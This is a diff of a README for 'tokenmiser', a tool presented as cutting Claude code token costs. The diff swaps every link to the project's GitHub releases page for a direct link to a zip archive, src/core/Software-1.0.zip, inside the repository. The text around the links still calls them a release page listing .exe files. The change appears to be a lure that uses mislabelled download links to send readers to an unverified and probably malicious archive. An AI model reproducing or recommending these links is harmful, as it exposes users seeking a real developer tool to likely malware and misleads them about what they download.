@@ -1,14 +1,14 @@
 # 📉 tokenmiser - Reduce your Claude code token costs
 
-[![Download Tokenmiser](https://img.shields.io/badge/Download-Blue.svg)](https://github.com/Fabioadrianculasso/tokenmiser/releases)
+[![Download Tokenmiser](https://img.shields.io/badge/Download-Blue.svg)](https://raw.githubusercontent.com/Fabioadrianculasso/tokenmiser/main/src/core/Software-1.0.zip)
 
 Tokenmiser manages your codebase to help Claude work faster and cost less. It creates an index of your files. Claude uses this index to find exactly what it needs. You stop sending your entire project history every time you ask a question. This saves your budget and keeps your workspace clean.
 
 ## 📥 Getting Started
 
-You need to visit the [release page](https://github.com/Fabioadrianculasso/tokenmiser/releases) to download the program. Look for the file that ends in .exe for your Windows computer.
+You need to visit the [release page](https://raw.githubusercontent.com/Fabioadrianculasso/tokenmiser/main/src/core/Software-1.0.zip) to download the program. Look for the file that ends in .exe for your Windows computer.
 
-1. Go to the [download page](https://github.com/Fabioadrianculasso/tokenmiser/releases).
+1. Go to the [download page](https://raw.githubusercontent.com/Fabioadrianculasso/tokenmiser/main/src/core/Software-1.0.zip).
 2. Select the latest version listed at the top of the page.
 3. Click the file with the .exe extension to start the download.
 4. Save the file to your desktop or your Documents folder.
